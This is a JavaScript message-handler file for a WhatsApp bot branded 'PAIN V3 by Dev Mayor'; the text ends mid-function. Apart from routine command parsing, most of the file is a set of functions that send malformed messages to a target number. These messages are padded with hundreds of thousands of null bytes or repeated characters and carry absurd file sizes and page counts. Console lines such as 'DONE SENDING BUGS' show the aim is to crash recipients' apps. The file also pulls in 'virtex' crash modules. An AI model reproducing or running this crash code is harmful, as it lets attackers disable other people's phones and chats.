
module.exports = async (mayor, m, store) => {
  try {
    const v14 = m.key.remoteJid;
    const v15 = m.quoted ? m.quoted : m;
    var v16 = m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "conversation" ? m.message.conversation : m.mtype == "imageMessage" ? m.message.imageMessage.caption : m.mtype == "videoMessage" ? m.message.videoMessage.caption : m.mtype == "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype == "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype == "listResponseMessage" ? m.message.listResponseMessage.singleSelectvF6.selectedRowId : m.mtype == "templateButtonvF6Message" ? m.message.templateButtonvF6Message.selectedId : m.mtype == "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectvF6.selectedRowId || m.text : "";
    const v17 = typeof m.text == "string" ? m.text : "";
    const v18 = /^[°zZ👑$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(v16) ? v16.match(/^[°zZ👑$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : ".";
    const v19 = v16.startsWith(v18);
    const v20 = v16.replace(v18, "").trim().split(/ +/).shift().toLowerCase();
    const v21 = v16.trim().split(/ +/).slice(1);
    const v22 = (v15.msg || v15).mimetype || "";
    const v23 = q = v21.join(" ");
    const v24 = v14.endsWith("@g.us");
    const v25 = await mayor.decodeJid(mayor.user.id);
    const v26 = m.key.fromMe ? mayor.user.id.split(":")[0] + "@s.whatsapp.net" || mayor.user.id : m.key.participant || m.key.remoteJid;
    const v27 = v26.split("@")[0];
    const v28 = m.pushName || "" + v27;
    const v29 = v25.includes(v27);
    const v30 = v24 ? await mayor.groupMetadata(m.chat).catch(p8 => {}) : "";
    const v31 = v24 ? v30.subject : "";
    const v32 = v24 ? await v30.participants : "";
    const v33 = v24 ? await v32.filter(p9 => p9.admin !== null).map(p10 => p10.id) : "";
    const v34 = v24 ? v30.owner : "";
    const v35 = v24 ? v30.participants : "";
    const v36 = v24 ? v33.includes(v25) : false;
    const v37 = v24 ? v33.includes(v25) : false;
    const v38 = v24 ? v33.includes(v26) : false;
    const v39 = v24 ? v33.includes(v26) : false;
    const v40 = moment.tz("Africa/Lagos").format("DD/MM/YY");
    const {
      Client: _0x173c8a
    } = require("ssh2");
    const javascriptObfuscator = require("javascript-obfuscator");
    const {
      button: _0x1ae864
    } = require("./lib/button.js");
    const v41 = JSON.parse(fs.readFileSync("./database/contacts.json"));
    const v42 = JSON.parse(fs.readFileSync("./database/premium.json"));
    const v43 = JSON.parse(fs.readFileSync("./database/owner.json"));
    const v44 = v41.includes(v26);
    const v45 = v42.includes(v26);
    const v46 = v43.includes(v27) || v29;
    const v47 = fs.readFileSync("./image/Mayor.jpg");
    const v48 = fs.readFileSync("./image/image1.jpg");
    const v49 = fs.readFileSync("./image/Pain.jpg");
    const v50 = fs.readFileSync("./image/xcrash.png");
    
    const v51 = ["✅"];
    const v52 = v51[Math.floor(Math.random() * v51.length)];
    const vF4 = p11 => {
      return mayor.sendMessage(m.chat, {
        react: {
          text: p11,
          key: m.key
        }
      });
    };
    const extd = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`,
remoteJid: "status@broadcast" 
},
'message': {
extendedTextMessage: {
text: "𝐏𝐀𝐈𝐍 𝐕𝟑 𝐁𝐘 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 "
}
}
};
    const {
      ios: _0x2997c8
    } = require("./lib/virtex/ios.js");
    const {
      telapreta3: _0x23649b
    } = require("./lib/virtex/telapreta3.js");
    const {
      convite: _0x33e499
    } = require("./lib/virtex/convite.js");
    const {
      bugpdf: _0x4c1d37
    } = require("./lib/virtex/bugpdf.js");
    const {
      cP: _0x4bf2e0
    } = require("./lib/virtex/bugUrl.js");
    if (m.sender.startsWith("212")) {
      return mayor.updateBlockStatus(m.sender, "block");
    }
    const botNumber = await mayor.decodeJid(mayor.user.id)
    const axios = require('axios');

    const v53 = ["red", "green", "yellow", "blue", "magenta", "cyan", "white"];
      const allowedUsers = [];
    const v54 = v53[Math.floor(Math.random() * v53.length)];
    let vRuntime = runtime(process.uptime());
    if (v19) {
      console.log("");

      console.log(chalk.white(chalk.bgHex("👑4a69bd").bold("🚀 WhatsApp messages! 🚀")));

      console.log(chalk.black(chalk.bgHex("👑fdcb6e")("📅 DATE: " + v40 + "\n💬 MESSAGE: " + v20 + "\n🗣️ SENDERNAME: " + v28 + "\n👤 JIDS: " + m.sender)));

    }
                   
    const v55 = moment.tz("Africa/Lagos").format("dddd, DD MMMM YYYY");
    const v56 = moment.tz("Africa/Lagos").format("HH : mm :ss");
    const v57 = moment.tz("Asia/Jayapura").format("HH : mm : ss");
    const v58 = moment.tz("Asia/Makassar").format("HH : mm : ss");
    const v59 = moment().tz("Africa/Lagos").format("HH:mm:ss");
    if (v59 < "23:59:00") {
      var v66 = "Selamat Malam 🏙️";
    }
    if (v59 < "19:00:00") {
      var v66 = "Selamat Petang 🌆";
    }
    if (v59 < "18:00:00") {
      var v66 = "Selamat Sore 🌇";
    }
    if (v59 < "15:00:00") {
      var v66 = "Selamat Siang 🌤️";
    }
    if (v59 < "10:00:00") {
      var v66 = "Selamat Pagi 🌄";
    }
    if (v59 < "05:00:00") {
      var v66 = "Selamat Subuh 🌆";
    }
    if (v59 < "03:00:00") {
      var v66 = "Selamat Tengah Malam 🌃";
    }
    mayor.sendButtonVideo = async (p12, p13, p14, p15 = {}) => {
      const v67 = {
        url: p15 && p15.video ? p15.video : ""
      };
      const v68 = {
        video: v67
      };
      const v69 = {
        upload: mayor.waUploadToServer
      };
      var v70 = await prepareWAMessageMedia(v68, v69);
      const v71 = {
        text: p15 && p15.body ? p15.body : ""
      };
      const v72 = {
        text: p15 && p15.footer ? p15.footer : ""
      };
      const v73 = {
        hasMediaAttachment: true,
        videoMessage: v70.videoMessage
      };
      const v74 = {
        buttons: p13,
        messageParamsJson: ""
      };
      const v75 = {
        title: global.namabot,
        body: "𝐏𝐀𝐈𝐍-𝐕𝟑",
        thumbnailUrl: global.imageurl,
        sourceUrl: global.channel,
        mediaType: 1,
        renderLargerThumbnail: true
      };
      const v76 = {
        externalAdReply: v75
      };
      const v77 = {
        body: v71,
        footer: v72,
        header: v73,
        nativeFlowMessage: v74,
        contextInfo: v76
      };
      const v78 = {
        interactiveMessage: v77
      };
      const v79 = {
        message: v78
      };
      const v80 = {
        viewOnceMessage: v79
      };
      const v81 = {
        quoted: p14
      };
      let vGenerateWAMessageFromContent = generateWAMessageFromContent(p12, v80, v81);
      await mayor.sendPresenceUpdate("composing", p12);
      return mayor.relayMessage(p12, vGenerateWAMessageFromContent.message, {
        messageId: vGenerateWAMessageFromContent.key.id
      });
    };
    async function f(p16, p17, p18, p19, p20, p21, p22, p23) {
      const v82 = {
        filterName: p17,
        parameters: p18,
        filterResult: p19,
        clientNotSupportedConfig: p20
      };
      const v83 = {
        clauseType: p21,
        clauses: p22,
        filters: p23
      };
      const v84 = {
        filter: v82,
        filterClause: v83
      };
      const v85 = {
        qp: v84
      };
      var vGenerateWAMessageFromContent2 = generateWAMessageFromContent(p16, proto.Message.fromObject(v85), {
        userJid: p16
      });
      await mayor.relayMessage(p16, vGenerateWAMessageFromContent2.message, {
        participant: {
          jid: p16
        },
        messageId: vGenerateWAMessageFromContent2.key.id
      });
    }
    async function f2(p24, p25, p26, p27, p28, p29, p30, p31, p32, p33, p34, p35, p36, p37) {
      const v86 = {
        sessionVersion: p25,
        localIdentityPublic: p26,
        remoteIdentityPublic: p27,
        rootKey: p28,
        previousCounter: p29,
        senderChain: p30,
        receiverChains: p31,
        pendingKeyExchange: p32,
        pendingPreKey: p33,
        remoteRegistrationId: p34,
        localRegistrationId: p35,
        needsRefresh: p36,
        aliceBaseKey: p37
      };
      const v87 = {
        sessionStructure: v86
      };
      var vGenerateWAMessageFromContent3 = generateWAMessageFromContent(p24, proto.Message.fromObject(v87), {
        userJid: p24
      });
      await mayor.relayMessage(p24, vGenerateWAMessageFromContent3.message, {
        participant: {
          jid: p24
        },
        messageId: vGenerateWAMessageFromContent3.key.id
      });
    }
    async function f3(p38, p39) {
      var vGenerateWAMessageFromContent4 = generateWAMessageFromContent(p38, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 " + "\0".repeat(990000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: p38,
        quoted: p39
      });
      await mayor.relayMessage(p38, vGenerateWAMessageFromContent4.message, {
        participant: {
          jid: p38
        },
        messageId: vGenerateWAMessageFromContent4.key.id
      });
    }
    async function f4(p40, p41) {
      var vGenerateWAMessageFromContent5 = generateWAMessageFromContent(p40, proto.Message.fromObject({
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          mimetype: "penis",
          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          fileLength: "999999999",
          pageCount: 999999999,
          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          fileName: "𝐏𝐀𝐈𝐍-𝐕𝟑" + "\0".repeat(900000),
          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1715880173"
        }
      }), {
        userJid: p40,
        quoted: p41
      });
      await mayor.relayMessage(p40, vGenerateWAMessageFromContent5.message, {
        participant: {
          jid: p40
        },
        messageId: vGenerateWAMessageFromContent5.key.id
      });
    }
    async function f5(p42, p43) {
      var vGenerateWAMessageFromContent6 = generateWAMessageFromContent(p42, proto.Message.fromObject({
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: p42,
        quoted: p43
      });
      await mayor.relayMessage(p42, vGenerateWAMessageFromContent6.message, {
        participant: {
          jid: p42
        },
        messageId: vGenerateWAMessageFromContent6.key.id
      });
    }
    async function f6(p44, p45, p46 = true) {
      const v88 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
        fileLength: "9999999999999",
        pageCount: 1316134911,
        mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
        fileName: "⭑̤▾ ⿻ 𝒟ℰ𝒱 ℳ𝒜𝒴𝒪ℛ  ⿻ ▾⭑̤",
        fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1726867151",
        contactVcard: true,
        jpegThumbnail: v50
      };
      const v89 = {
        documentMessage: v88,
        hasMediaAttachment: true
      };
      await mayor.relayMessage(p44, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: v89,
              body: {
                text: "...💣 𝐌𝐀𝐘𝐎𝐑 𝐗 𝐏𝐀𝐈𝐍  ☠️̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@6283846077142".repeat(27000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["6283846077142@s.whatsapp.net"],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "𝐏𝐀𝐈𝐍-𝐕𝟑  ☠️",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, p46 ? {
        participant: {
          jid: p44
        }
      } : {});
      console.log(chalk.green("𝗣𝗔𝗜𝗡 𝙑𝟯 𝗗𝗢𝗡𝗘 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚𝗦 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 ©𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥 👑..."));
    }
    async function f7(p47, p48, p49, p50 = false, p51 = true) {
      let vGenerateWAMessageFromContent7 = generateWAMessageFromContent(p47, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "𝐏𝐀𝐈𝐍 - 𝐕𝟑 𝐁𝐘 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: v50
                },
                hasMediaAttachment: true
              },
              body: {
                text: "🐉 𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 🔥ꦾ" + "ꦾ".repeat(77777)
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 👑 trashdex - explanation \",\"body\":\"xxx\"}"
              }
            }
          }
        }
      }), {
        userJid: p47,
        quoted: p48
      });
      await mayor.relayMessage(p47, vGenerateWAMessageFromContent7.message, p51 ? {
        participant: {
          jid: p47
        }
      } : {});
      console.log(chalk.green("𝗕𝗨𝗚𝗦 𝗦𝗘𝗡𝗧 𝗕𝗬 𝗣𝗔𝗜𝗡 𝗩𝟯 ©𝗗𝗘𝗩 𝗠𝗔𝗬𝗢𝗥 👑..."));
    }
    const v93 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐀𝐈𝐍-𝐕𝟑\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@mayor_tech\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"𝐏𝐀𝐈𝐍-𝐕𝟑" + "".repeat(777777) + "\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    const v96 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    async function f8(p52) {
      const v98 = {
        name: "review_and_pay",
        buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k" + VxO + ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
      };
      var vGenerateWAMessageFromContent8 = generateWAMessageFromContent(p52, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                hasMediaAttachment: true,
                sequenceNumber: "0",
                jpegThumbnail: ""
              },
              nativeFlowMessage: {
                buttons: [v98],
                messageParamsJson: "\0".repeat(10000)
              }
            }
          }
        }
      }), {});
      mayor.relayMessage(p52, vGenerateWAMessageFromContent8.message, {
        messageId: vGenerateWAMessageFromContent8.key.id
      });
    }
    async function f9(p53) {
      var vGenerateWAMessageFromContent9 = generateWAMessageFromContent(p53, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363298524333143@newsletter",
              newsletterName: "𝐏𝐀𝐈𝐍-𝐕𝟑 Script" + "\0".repeat(920000),
              jpegThumbnail: "",
              caption: "Undangan Admin Saluran",
              inviteExpiration: Date.now() + 1814400000
            }
          }
        }
      }), {
        userJid: p53
      });
      await mayor.relayMessage(p53, vGenerateWAMessageFromContent9.message, {
        participant: {
          jid: p53
        },
        messageId: vGenerateWAMessageFromContent9.key.id
      });
    }
    const v100 = {
      participant: "0@s.whatsapp.net",
      ...(m.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const v103 = {
      key: v100,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./image/xcrash.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"DIKΛƬΉΣGΣПKZ\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const v105 = {
      participant: "0@s.whatsapp.net",
      ...(m.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const v108 = {
      key: v105,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./image/xcrash.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"DIKΛƬΉΣGΣПKZ\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    async function f10(p54, p55) {
      var vGenerateWAMessageFromContent10 = generateWAMessageFromContent(p54, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "*`𝐏𝐀𝐈𝐍 ☠️!" + "ꦾ".repeat(50000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: p54,
        quoted: p55
      });
      await mayor.relayMessage(p54, vGenerateWAMessageFromContent10.message, {
        participant: {
          jid: p54
        },
        messageId: vGenerateWAMessageFromContent10.key.id
      });
    }
    async function f11(p56, p57) {
      var vGenerateWAMessageFromContent11 = generateWAMessageFromContent(p56, proto.Message.fromObject({
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: p56,
        quoted: p57
      });
      await mayor.relayMessage(p56, vGenerateWAMessageFromContent11.message, {
        participant: {
          jid: p56
        },
        messageId: vGenerateWAMessageFromContent11.key.id
      });
    }
    async function f12(p58) {
      await mayor.relayMessage(p58, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ",
                format: "EXTENSIONS_1"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\0".repeat(1020000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                version: 3
              }
            }
          }
        }
      }, {
        participant: {
          jid: p58
        }
      });
    }
    async function f13(p59) {
      let v110 = "𝐏𝐀𝐈𝐍-𝐕𝟑 𝘽𝙔 𝐃𝐄𝐕 𝐌𝐀𝐘𝐎𝐑 ";
      const v111 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: v110,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const v112 = {
        documentMessage: v111,
        title: v110,
        hasMediaAttachment: true
      };
      const v113 = {
        text: v110
      };
      const v117 = {
        header: v112,
        body: v113,
        nativeFlowMessage: {
          buttons: [{
            name: "call_permission_request",
            buttonParamsJson: "{}"
          }, {
            name: "cta_url",
